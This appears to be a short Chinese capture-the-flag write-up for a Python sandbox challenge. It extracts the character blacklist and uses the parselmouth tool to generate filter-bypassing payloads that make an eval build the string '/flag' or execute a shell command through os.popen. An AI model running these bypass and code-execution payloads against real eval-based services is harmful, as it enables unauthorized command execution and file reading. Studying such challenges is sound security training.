题目代码比较简单，大致阅读下代码即可提取出黑名单规则：`r"[A-Zd-z\\. /*$#@!+^]"`。后面 open 里使用了 eval，要么是让 eval 返回一个 `/flag` 直接尝试读取，要么就是 rce。

以构造 `/flag` 字符串为例子：

```
python3 parselmouth.py --payload "'/flag'" --rule "__" "." "'" '"' "read" "chr" "\\" "/" "*" "$" "#" "@" " " "+" "^" "A" "B" "C" "D" "E" "F" "G" "H" "I" "J" "K" "L" "M" "N" "O" "P" "Q" "R" "S" "T" "U" "V" "W" "X" "Y" "Z" "d" "e" "f" "g" "h" "i" "j" "k" "l" "m" "n" "o" "p" "q" "r" "s" "t" "u" "v" "w" "x" "y" "z"
```

或者直接

```
python3 parselmouth.py --payload "'/flag'" --re-rule '[A-Zd-z\\. /*$#@]'
```

RCE 的话，可以把命令的输出重定向到一个文件中，最后在 echo 返回这个文件名的字符串，举例：

```
python3 parselmouth.py --payload "__import__('os').popen('id > txt 2>&1 |echo txt').read().strip()" --re-rule '[A-Zd-z\\. /*$#@]'
```
